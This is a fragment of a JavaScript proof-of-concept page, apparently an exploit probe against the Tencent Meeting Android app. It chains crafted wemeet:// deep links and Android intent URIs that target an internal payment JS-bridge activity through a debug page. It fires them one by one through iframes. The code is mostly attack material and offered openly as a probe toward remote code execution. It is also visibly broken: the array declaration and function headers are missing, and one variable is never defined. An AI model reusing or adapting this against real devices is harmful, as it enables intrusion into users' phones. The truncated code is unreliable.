<script>
document.title='P23L-START';
var tb='https://gitwhs.github.io/wm-poc-rce/probe23tb.html';
var midas='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.jsbridge.APWebJSBridgeActivity;end';
var midas2='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.jsbridge.APWebJSBridgeActivity;S.key_pure_h5_pay=value_pure_h5_pay;end';

  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(midas2),
  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(proxy),

  if(i>=schemes.length){ document.title='P23L-DONE-IFRAMES'; return; }
  var s=schemes[i++];
  document.title='P23L-IFRAME-'+i;
  var f=document.createElement('iframe');

  document.body.appendChild(f);
  setTimeout(fire, 3500);
